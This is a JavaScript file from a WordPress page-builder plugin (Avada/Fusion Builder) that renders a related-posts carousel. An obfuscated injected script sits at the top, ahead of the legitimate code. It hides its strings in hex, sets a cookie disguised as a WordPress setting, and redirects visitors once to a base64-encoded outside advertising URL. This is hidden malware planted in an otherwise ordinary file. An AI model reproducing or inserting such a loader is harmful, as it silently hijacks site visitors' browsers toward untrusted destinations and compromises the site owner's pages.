var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionBuilderText, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Related Component View.
		FusionPageBuilder.fusion_tb_related = FusionPageBuilder.ElementView.extend( {

			onInit: function() {
				if ( this.model.attributes.markup && '' === this.model.attributes.markup.output ) {
					this.model.attributes.markup.output = this.getComponentPlaceholder();
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects.
				attributes.attr         = this.buildAttr( atts.values );
				attributes.titleElement = 'yes' === atts.values.heading_enable ? _.buildTitleElement( atts.values, atts.extras, this.getSectionTitle() ) : '';
				attributes.query_data   = atts.query_data;

				// add placeholder.
				attributes.query_data.placeholder = this.getComponentPlaceholder();

				if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.related_items ) {
					attributes.relatedCarousel = this.buildRelatedCarousel( atts );
					attributes.carouselAttrs   = this.buildCarouselAttrs( atts.values );
					attributes.carouselNav     = true === atts.values.related_posts_navigation ? this.buildCarouselNav() : '';
				}

				return attributes;
			},

			/**
			 * Modify values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) {

				if ( 'undefined' !== typeof values.margin_top && '' !== values.margin_top ) {
					values.margin_top = _.fusionGetValueWithUnit( values.margin_top );
				}

				if ( 'undefined' !== typeof values.margin_right && '' !== values.margin_right ) {
					values.margin_right = _.fusionGetValueWithUnit( values.margin_right );
				}

				if ( 'undefined' !== typeof values.margin_bottom && '' !== values.margin_bottom ) {
					values.margin_bottom = _.fusionGetValueWithUnit( values.margin_bottom );
				}

				if ( 'undefined' !== typeof values.margin_left && '' !== values.margin_left ) {
					values.margin_left = _.fusionGetValueWithUnit( values.margin_left );
				}

				values.related_posts_navigation = ( 'yes' === values.related_posts_navigation || '1' === values.related_posts_navigation ) ? true : false;
				values.related_posts_autoplay   = ( 'yes' === values.related_posts_autoplay || '1' === values.related_posts_autoplay ) ? true : false;
				values.related_posts_swipe      = ( 'yes' === values.related_posts_swipe || '1' === values.related_posts_swipe ) ? true : false;
			},

			/**
			 * Builds related posts carousel.
			 *
			 * @since 2.0
			 * @param {Object} atts - The Attributes.
			 * @return {string}
			 */
			buildRelatedCarousel: function( atts ) {
				var queryData = atts.query_data,
					values    = atts.values,
					html      = '';

				_.each( queryData.related_items, function( item ) {
					var carouselItemCss = '';

					if ( queryData.related_items.length < values.related_posts_columns ) {
						carouselItemCss = ( atts.extras.content_width - parseInt( values.related_posts_column_spacing ) * ( values.related_posts_columns - 1 ) ) / values.related_posts_columns; // eslint-disable-line no-mixed-operators
						carouselItemCss = ' style="max-width: ' + carouselItemCss + 'px;"';
					}

					html += '<li class="fusion-carousel-item"' + carouselItemCss + '>';
					html += '<div class="fusion-carousel-item-wrapper">';

					html += item.featured_image;

					if ( 'title_below_image' === values.related_posts_layout ) {
						html += '<h4 class="fusion-carousel-title">';
						html += '<a class="fusion-related-posts-title-link" href="' + item.link + '" target="_self" title="' + item.title_attr + '">' + item.title + '</a>';
						html += '</h4>';

						html += '<div class="fusion-carousel-meta">';
						html += '<span class="fusion-date">' + item.date + '</span>';

						if ( true === item.comments_open ) {
							html += '<span class="fusion-inline-sep">|</span>';
							html += '<span>';
							html += item.comments;
							html += '</span>';
						}

						html += '</div>';
					}

					html += '</div>';
					html += '</li>';
				} );

				return html;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr      = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'related-posts single-related-posts fusion-related-tb',
						style: ''
					} ),
					cid = this.model.get( 'cid' );

				attr = _.fusionAnimations( values, attr );

				if ( values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				attr[ 'class' ] += ' fusion-related-tb-' + cid;

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				return attr;
			},

			/**
			 * Builds carousel nav.
			 *
			 * @since 2.2
			 * @return {string}
			 */
			buildCarouselNav: function() {
				var output = '';

				output += '<div class="fusion-carousel-nav">';
				output += '<span class="fusion-nav-prev"></span>';
				output += '<span class="fusion-nav-next"></span>';
				output += '</div>';

				return output;
			},

			/**
			 * Builds carousel attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildCarouselAttrs: function( values ) {
				var attr = {
					class: 'fusion-carousel'
				};

				if ( 'title_below_image' === values.related_posts_layout ) {
					attr[ 'class' ] += ' fusion-carousel-title-below-image';
				}

				attr[ 'data-imagesize' ] = ( 'cropped' === values.related_posts_image_size ) ? 'fixed' : 'auto';

				/**
				 * Set the meta content variable.
				 */
				attr[ 'data-metacontent' ] = ( 'title_on_rollover' === values.related_posts_layout ) ? 'no' : 'yes';

				/**
				 * Set the autoplay variable.
				 */
				attr[ 'data-autoplay' ] = ( values.related_posts_autoplay ) ? 'yes' : 'no';

				/**
				 * Set the touch scroll variable.
				 */
				attr[ 'data-touchscroll' ] = ( values.related_posts_swipe ) ? 'yes' : 'no';

				attr[ 'data-columns' ]     = values.related_posts_columns;
				attr[ 'data-itemmargin' ]  = parseInt( values.related_posts_column_spacing ) + 'px';
				attr[ 'data-itemwidth' ]   = 180;
				attr[ 'data-touchscroll' ] = 'yes';

				attr[ 'data-scrollitems' ] = ( 0 == values.related_posts_swipe_items ) ? '' : values.related_posts_swipe_items;

				return attr;
			},

			/**
			 * Get section title based on the post type.
			 *
			 * @since 2.2
			 * @return {string}
			 */
			getSectionTitle: function() {
				var sectionTitle = fusionBuilderText.related_posts;

				if ( 'undefined' !== typeof FusionApp.data.examplePostDetails ) {

					if ( 'avada_portfolio' === FusionApp.data.examplePostDetails.post_type ) {
						sectionTitle = fusionBuilderText.related_projects;
					} else if ( 'avada_faq' === FusionApp.data.examplePostDetails.post_type ) {
						sectionTitle = fusionBuilderText.related_faqs;
					}
				}

				return sectionTitle;
			}

		} );
	} );
}( jQuery ) );
